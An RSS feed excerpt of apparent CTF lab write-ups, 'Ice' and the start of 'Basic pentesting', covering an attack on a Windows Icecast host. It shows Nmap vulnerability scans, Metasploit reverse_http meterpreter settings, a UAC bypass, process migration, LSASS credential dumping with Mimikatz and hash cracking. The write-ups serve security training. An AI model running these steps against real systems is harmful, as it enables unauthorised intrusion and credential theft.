&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set target 2&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set SRVHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set LHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set payload windows/meterpreter/reverse_http&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;run -j&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;
&lt;div class=&quot;callout-title&quot;&gt;
                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;
                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;NOTE&lt;/p&gt;&lt;/div&gt;
                  
                &lt;/div&gt;
&lt;div class=&quot;callout-content&quot;&gt;
&lt;p&gt;I found that I needed to set the SRVHOST option to get &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt; to deliver the exploit on the right interface.&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;This particular exploit outputs and encoded &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/powershell&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/powershell&quot;&gt;PowerShell&lt;/a&gt; script and then starts a local listener to deliver the actual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell. All we need to do is cut-and-paste into our elevated shell.&lt;/p&gt;
&lt;p&gt;(For whatever reason, I could &lt;em&gt;only&lt;/em&gt; get this exploit working with the 32-bit version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; &lt;em&gt;and&lt;/em&gt; the &lt;code&gt;run -j&lt;/code&gt; command. I’m not sure why…)&lt;/p&gt;
&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;
&lt;div class=&quot;callout-title&quot;&gt;
                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;
                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;NOTE&lt;/p&gt;&lt;/div&gt;
                  
                &lt;/div&gt;
&lt;div class=&quot;callout-content&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; flags this as being deprecated now; the modern pattern seems to be to background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; and then switch to and exploit the &lt;code&gt;exploit/windows/local/persistence&lt;/code&gt; module, probably with &lt;code&gt;set STARTUP SYSTEM&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 15 min&lt;/p&gt;</description>
    <pubDate>Wed, 08 Dec 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Ice</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-12-07-ice</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-12-07-ice</guid>
    <description>&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The machine we’ll be attacking is at 10.10.55.173. Since it’s a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/windows&quot;&gt;Windows&lt;/a&gt; box, we know that it won’t respond to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ping&quot; class=&quot;internal&quot; data-slug=&quot;spells/ping&quot;&gt;ping&lt;/a&gt; by default.&lt;/p&gt;
&lt;p&gt;As usual, we’ll start out with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ice&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.55.173&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Which gives us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Dec  7 20:55:44 2021 as: nmap -v -oA ice -Pn -A -T4 -sS -script vuln -p- 10.10.55.173
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Increasing send delay for 10.10.55.173 from 0 to 5 due to 387 out of 967 dropped probes since last increase.
Increasing send delay for 10.10.55.173 from 5 to 10 due to 48 out of 119 dropped probes since last increase.
Nmap scan report for 10.10.55.173
Host is up (0.18s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
8000/tcp  open  http               Icecast streaming media server
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&#039;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/7%OT=135%CT=1%CU=42453%PV=Y%DS=4%DC=T%G=Y%TM=61B035
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M
OS:506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Uptime guess: 0.035 days (since Tue Dec  7 20:41:59 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   34.62 ms  10.13.0.1
2   ... 3
4   179.31 ms 10.10.55.173

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  7 21:31:59 2021 -- 1 IP address (1 host up) scanned in 2174.84 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(An interesting effect of the -T4 flag, which uses a slightly more aggressive timing timing profile, is that port discovery seems to happen out-of-order…)&lt;/p&gt;
&lt;h2 id=&quot;gain-access&quot;&gt;Gain access&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#gain-access&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The next few flags are about finding a particular vulnerability for Icecast on &lt;a href=&quot;https://cvedetails.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://cvedetails.com&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. There’s actually a couple of different vulnerabilities that match the flag descriptions, but after a little trial-and-error we can find the &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2004-1561/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;right one&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There’s not too much to the corresponding &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt; module — set RHOSTS and LHOST, run, get shell.&lt;/p&gt;
&lt;h2 id=&quot;escalate&quot;&gt;Escalate&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#escalate&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We can find the current user using the getuid command. The sysinfo command will give us the OS version and architecture.&lt;/p&gt;
&lt;p&gt;With that out of the way, we can use &lt;code&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt; to find potential paths to elevating privileges.&lt;/p&gt;
&lt;p&gt;Unfortunately, for me this only returns one result — &lt;code&gt;exploit/windows/local/ms10_092_schelevator&lt;/code&gt; — which is not accepted as the 12th flag. The flag hint states that the exploit will contain eventvwr. A quick search through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt; shows that the only exploit including this string is &lt;code&gt;exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;, which &lt;em&gt;is&lt;/em&gt; accepted.&lt;/p&gt;
&lt;p&gt;We can background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; with Ctrl+Z and then switch to this exploit using &lt;code&gt;use exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;. This exploit runs through an existing session, so we need to set this using &lt;code&gt;set SESSION 2&lt;/code&gt;. (I’m on session 2 because I previously backed out an unsuccessfully tried to pop a 64-bit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell — I guess Icecast is running as a 32-bit process.)&lt;/p&gt;
&lt;p&gt;I also tweaked LPORT, as I’m nervous about killing the existing session (which is running on the default port, 4444).&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;run&lt;/code&gt; quickly pops a new shell.&lt;/p&gt;
&lt;h2 id=&quot;looting&quot;&gt;Looting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#looting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;In order to harvest credentials from LSASS we’ll need to migrate &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; to a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS. The print spooler service is a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;migrate -N spoolsv.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;We’re going to loot LSASS now using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/mimikatz&quot;&gt;Mimikatz&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;load kiwi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;It turns out that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/windows&quot;&gt;Windows&lt;/a&gt; loads &lt;em&gt;unhashed&lt;/em&gt; passwords into LSASS for any users with scheduled jobs!&lt;/p&gt;
&lt;h2 id=&quot;past-exploitation&quot;&gt;Past-exploitation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#past-exploitation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Hashes dumped using hashdump can be cracked offline using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/john-the-ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/john-the-ripper&quot;&gt;John the Ripper&lt;/a&gt;. It can be helpful to know a little about &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/kerberos&quot;&gt;Kerberos&lt;/a&gt; tickets at this point&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 39 min&lt;/p&gt;</description>
    <pubDate>Tue, 07 Dec 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Basic pentesting</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-11-04-basic-pentesting</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-11-04-basic-pentesting</guid>
    <description>&lt;h2 id=&quot;background&quot;&gt;Background&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#background&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The description of this CTF is sparse, but the goal seems to be to (1) enumerate the services on a machine, (2) brute force a login over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt;, and (3) elevate privileges (presumably to root, but things are a little vague here).&lt;/p&gt;
&lt;p&gt;For this attempt, the target machine IP is 10.10.74.250.&lt;/p&gt;
&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We begin by running a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; basic-pentesting&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Nov  4 19:56:42 2021 as: nmap -vv -oA basic-pentesting -A -sS --script vuln -p- 10.10.74.250
Increasing send delay for 10.10.74.250 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.74.250 from 10 to 20 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.74.250
Host is up, received timestamp-reply ttl 61 (0.17s latency).
Scanned at 2021-11-04 19:56:54 MDT for 1378s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| vulners: 
